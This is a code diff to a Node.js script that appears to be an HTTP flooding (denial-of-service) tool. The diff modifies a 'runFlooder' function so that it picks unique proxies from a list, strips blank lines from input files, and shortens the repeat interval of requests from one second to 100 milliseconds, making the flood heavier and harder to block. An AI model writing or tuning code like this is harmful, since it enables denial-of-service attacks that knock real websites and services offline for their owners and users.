@@ -278,7 +278,7 @@ if (cluster.isMaster) {
         cluster.fork();
     }
 } else {
-    setInterval(runFlooder);
+    runFlooder();
 }
 
 class NetSocket {
@@ -326,7 +326,7 @@ function getRandomInt(min, max) {
 const socket = new NetSocket();
 
 function readLines(filePath) {
-    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
 }
 
 function getRandomValue(arr) {
@@ -363,8 +363,6 @@ function randomString(length) {
     }
     return result;
 }
-
-const randomStringValue = randomString(10);
 
 const osNames = [
     "Windows 1.01", "Windows 1.02", "Windows 1.03", "Windows 1.04", "Windows 2.01",
@@ -415,13 +413,19 @@ const nelValue = {
 };
 
 function runFlooder() {
-    const threadProxies = [];
+    const selectedProxies = [];
+    const availableProxies = [...proxies];
+
     for (let i = 0; i < 10; i++) {
-        threadProxies.push(randomElement(proxies));
+        if (availableProxies.length === 0) {
+            console.log("Not enough unique proxies available. Reusing proxies.");
+            availableProxies.push(...proxies);
+        }
+        const randomIndex = Math.floor(Math.random() * availableProxies.length);
+        selectedProxies.push(availableProxies.splice(randomIndex, 1)[0]);
     }
 
-    let currentProxyIndex = 0;
-    let requestsSentForCurrentProxy = 0;
+    const mainProxy = randomElement(proxies);
 
     const sendRequest = (proxyAddr) => {
         const parsedProxy = proxyAddr.split(":");
@@ -557,11 +561,10 @@ function runFlooder() {
     };
 
     for (let i = 0; i < 10; i++) {
-        sendRequest(threadProxies[i]);
+        sendRequest(selectedProxies[i]);
     }
 
-    const eleventhProxy = randomElement(proxies);
-    setInterval(() => sendRequest(eleventhProxy), 1000);
+    setInterval(() => sendRequest(mainProxy), 100);
 }
 
 const stopScript = () => process.exit(1);
